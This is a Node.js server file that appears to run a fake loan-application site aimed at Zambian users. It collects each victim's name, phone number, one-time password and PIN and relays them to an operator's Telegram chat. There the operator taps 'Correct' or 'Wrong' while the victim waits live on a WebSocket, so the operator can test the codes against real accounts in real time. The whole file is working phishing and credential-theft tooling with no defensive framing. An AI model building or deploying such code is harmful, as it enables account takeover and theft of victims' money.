const express = require('express');
const http = require('http');
const https = require('https');
const { WebSocketServer, WebSocket } = require('ws');

// ═══════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars!');
    process.exit(1);
}

// ═══════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════
const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

app.use(express.static(__dirname));
app.use(express.json());

const sessions = {};

// ═══════════════════════════════════════════
// WEBSOCKET
// ═══════════════════════════════════════════
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'http://localhost:' + PORT);
    const sessionId = url.searchParams.get('session');

    if (sessionId && sessions[sessionId]) {
        sessions[sessionId].ws = ws;
        console.log('✅ WS connected:', sessions[sessionId].name);
    }

    ws.on('close', () => {
        if (sessionId && sessions[sessionId]) {
            sessions[sessionId].ws = null;
            console.log('❌ WS disconnected:', sessions[sessionId].name);
        }
    });
});

// ═══════════════════════════════════════════
// TELEGRAM HTTPS HELPER
// ═══════════════════════════════════════════
function tgRequest(method, path, body) {
    return new Promise((resolve, reject) => {
        const payload = body ? JSON.stringify(body) : null;
        const opts = { method, hostname: 'api.telegram.org', path };
        if (payload) {
            opts.headers = {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            };
        }
        const req = https.request(opts, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch (e) { resolve({ ok: false, raw: data }); }
            });
        });
        req.setTimeout(35000, () => { req.destroy(); reject(new Error('timeout')); });
        req.on('error', reject);
        if (payload) req.write(payload);
        req.end();
    });
}

function sendTelegram(text, buttons) {
    const body = { chat_id: TELEGRAM_CHAT_ID, text };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', body)
        .then(res => {
            if (res.ok) console.log('✅ TG sent');
            else console.error('❌ TG error:', JSON.stringify(res));
        })
        .catch(err => console.error('❌ Network:', err.message));
}

function answerCallback(cqId, text) {
    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
        callback_query_id: cqId,
        text: text
    }).catch(() => {});
}

// ═══════════════════════════════════════════
// PAGE 1: Application
// ═══════════════════════════════════════════
app.post('/api/apply', async (req, res) => {
    const { name, phone, amount, period } = req.body;

    if (!name || !phone || !amount || !period) {
        return res.status(400).json({ error: 'Missing fields' });
    }

    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const interest = Math.round(amount * 0.0013 * period);
    const total = amount + interest;

    sessions[sessionId] = {
        ws: null,
        name, phone, amount, period,
        otp: '', pin: ''
    };

    const msg = '📋 NEW LOAN APPLICATION\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '👤 Name: ' + name + '\n' +
        '📱 Phone: ' + phone + '\n' +
        '💰 Amount: K' + amount.toLocaleString() + '\n' +
        '📅 Period: ' + period + ' days\n' +
        '📊 Interest: K' + interest.toLocaleString() + '\n' +
        '💵 Total Repay: K' + total.toLocaleString() + '\n' +
        '🕐 ' + new Date().toLocaleString('en-ZM') + '\n' +
        '━━━━━━━━━━━━━━━━━━';

    await sendTelegram(msg);
    console.log('📋 Application received:', name, sessionId);
    res.json({ success: true, sessionId });
});

// ═══════════════════════════════════════════
// PAGE 2: OTP (4 digits + admin buttons)
// ═══════════════════════════════════════════
app.post('/api/otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    const session = sessions[sessionId];

    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.otp = otp;

    const msg = '📲 OTP SUBMITTED\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '👤 Name: ' + session.name + '\n' +
        '📱 Phone: ' + session.phone + '\n' +
        '💰 Amount: K' + session.amount.toLocaleString() + '\n' +
        '🔢 OTP: ' + otp + '\n' +
        '🕐 ' + new Date().toLocaleString('en-ZM') + '\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Tap below to verify:';

    const buttons = [[
        { text: '✅ Correct OTP', callback_data: 'otpc:' + sessionId },
        { text: '❌ Wrong OTP', callback_data: 'otpw:' + sessionId }
    ]];

    await sendTelegram(msg, buttons);
    console.log('📲 OTP sent to admin:', session.name, otp);
    res.json({ success: true, waiting: true });
});

// ═══════════════════════════════════════════
// PAGE 3: PIN (5 digits + admin buttons)
// ═══════════════════════════════════════════
app.post('/api/pin', async (req, res) => {
    const { sessionId, pin } = req.body;
    const session = sessions[sessionId];

    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.pin = pin;

    const msg = '🔐 PIN SUBMITTED\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '👤 Name: ' + session.name + '\n' +
        '📱 Phone: ' + session.phone + '\n' +
        '🔑 PIN: ' + pin + '\n' +
        '🕐 ' + new Date().toLocaleString('en-ZM') + '\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Tap below to verify:';

    const buttons = [[
        { text: '✅ Correct PIN', callback_data: 'pinc:' + sessionId },
        { text: '❌ Wrong PIN', callback_data: 'pinw:' + sessionId }
    ]];

    await sendTelegram(msg, buttons);
    console.log('🔐 PIN sent to admin:', session.name, pin);
    res.json({ success: true, waiting: true });
});

// ═══════════════════════════════════════════
// TELEGRAM LONG POLLING (fixes button issue)
// ═══════════════════════════════════════════
let offset = 0;

async function pollTelegram() {
    try {
        // timeout=30 = long polling (keeps connection open, instant callback delivery)
        const data = await tgRequest('GET', '/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + offset + '&timeout=30');

        if (data.ok) {
            for (const update of data.result) {
                offset = update.update_id + 1;

                if (!update.callback_query) continue;

                const cq = update.callback_query;
                const cbData = cq.data; // e.g. "otpc:Slx3k2a9fB"
                const sepIndex = cbData.indexOf(':');
                const action = cbData.substring(0, sepIndex);
                const sessionId = cbData.substring(sepIndex + 1);
                const session = sessions[sessionId];

                console.log('🔘 Button clicked:', action, 'session:', sessionId);

                if (!session) {
                    await answerCallback(cq.id, '⚠️ Session expired. Re-apply.');
                    continue;
                }

                // ─── OTP CORRECT ───
                if (action === 'otpc') {
                    await answerCallback(cq.id, '✅ OTP Approved!');
                    await sendTelegram(
                        '✅ OTP VERIFIED\n━━━━━━━━━━━━━━━━━━\n' +
                        '👤 ' + session.name + '\n📱 ' + session.phone + '\n' +
                        '🔢 OTP: ' + session.otp + '\n🕐 ' + new Date().toLocaleString('en-ZM')
                    );
                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                        session.ws.send(JSON.stringify({ type: 'otp_result', result: 'correct' }));
                    }
                    console.log('✅ OTP CORRECT:', session.name);

                // ─── OTP WRONG ───
                } else if (action === 'otpw') {
                    await answerCallback(cq.id, '❌ OTP Rejected');
                    await sendTelegram(
                        '❌ OTP REJECTED\n━━━━━━━━━━━━━━━━━━\n' +
                        '👤 ' + session.name + '\n📱 ' + session.phone + '\n' +
                        '🔢 OTP: ' + session.otp + '\n🕐 ' + new Date().toLocaleString('en-ZM') + '\n' +
                        '🔄 User notified to retry'
                    );
                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                        session.ws.send(JSON.stringify({ type: 'otp_result', result: 'wrong' }));
                    }
                    console.log('❌ OTP WRONG:', session.name);

                // ─── PIN CORRECT ───
                } else if (action === 'pinc') {
                    await answerCallback(cq.id, '✅ PIN Approved! Complete!');
                    await sendTelegram(
                        '🎉 APPLICATION COMPLETE\n━━━━━━━━━━━━━━━━━━\n' +
                        '👤 ' + session.name + '\n📱 ' + session.phone + '\n' +
                        '💰 K' + session.amount.toLocaleString() + ' / ' + session.period + ' days\n' +
                        '🔑 PIN: ' + session.pin + '\n🔢 OTP: ' + session.otp + '\n' +
                        '🕐 ' + new Date().toLocaleString('en-ZM')
                    );
                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                        session.ws.send(JSON.stringify({ type: 'pin_result', result: 'correct' }));
                    }
                    console.log('✅ PIN CORRECT:', session.name, '— COMPLETE');

                // ─── PIN WRONG ───
                } else if (action === 'pinw') {
                    await answerCallback(cq.id, '❌ PIN Rejected');
                    await sendTelegram(
                        '❌ PIN REJECTED\n━━━━━━━━━━━━━━━━━━\n' +
                        '👤 ' + session.name + '\n📱 ' + session.phone + '\n' +
                        '🔑 PIN: ' + session.pin + '\n🕐 ' + new Date().toLocaleString('en-ZM') + '\n' +
                        '🔄 User notified to retry'
                    );
                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                        session.ws.send(JSON.stringify({ type: 'pin_result', result: 'wrong' }));
                    }
                    console.log('❌ PIN WRONG:', session.name);
                }
            }
        }
    } catch (err) {
        if (err.message === 'timeout') {
            // Normal — no updates in 30s, just retry
        } else {
            console.error('Polling error:', err.message);
        }
    }
    // Retry immediately (long polling already waited 30s)
    setTimeout(pollTelegram, 500);
}

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
server.listen(PORT, () => {
    console.log('');
    console.log('🚀 Server on port ' + PORT);
    console.log('📡 WebSocket: /ws');
    console.log('🤖 Telegram long-polling started (30s)');
    console.log('🔑 Token: SET');
    console.log('👤 Chat: ' + TELEGRAM_CHAT_ID);
    console.log('');
    pollTelegram();
});   
